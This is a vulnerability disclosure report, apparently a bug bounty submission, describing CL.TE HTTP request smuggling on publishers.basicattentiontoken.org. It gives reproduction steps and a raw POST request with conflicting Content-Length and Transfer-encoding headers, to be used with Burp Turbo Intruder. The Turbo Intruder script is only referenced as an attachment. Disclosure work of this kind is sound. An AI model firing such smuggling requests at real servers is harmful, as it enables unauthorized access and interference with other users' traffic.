## Metadata

## Original Report

When malformed or abnormal HTTP requests are interpreted by one or more entities in the data flow between the user and the web server, such as a proxy or firewall, they can be interpreted inconsistently, allowing the attacker to "smuggle" a request to one device without the other device being aware of it. 

 publishers.basicattentiontoken.org is vulnerable to CL TE ( Front end server uses Content-Length , Back-end Server uses Transfer-encoding ) HTTP request smuggling attack.

## Products affected: 

Brave Website. : publishers.basicattentiontoken.org

## Steps To Reproduce:
1.  Run the burp suite turbo intruder on the following request

```
POST /publishers/registrations.json HTTP/1.1
Host: publishers.basicattentiontoken.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://publishers.basicattentiontoken.org/sign-up
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Origin: https://publishers.basicattentiontoken.org
Content-Length: 136
DNT: 1
Connection: close
Transfer-encoding: chunked

```

2. Script for tubro Intruder is attached. Word list can be any list containing any characters.
3. Observe 200 OK response for the /publishers/registrations.json post request which is supposed to give {"message":"Unverified request"}. Please refer the attached screenshot ( Smuggle Request1.png ) whih contain the expected response.
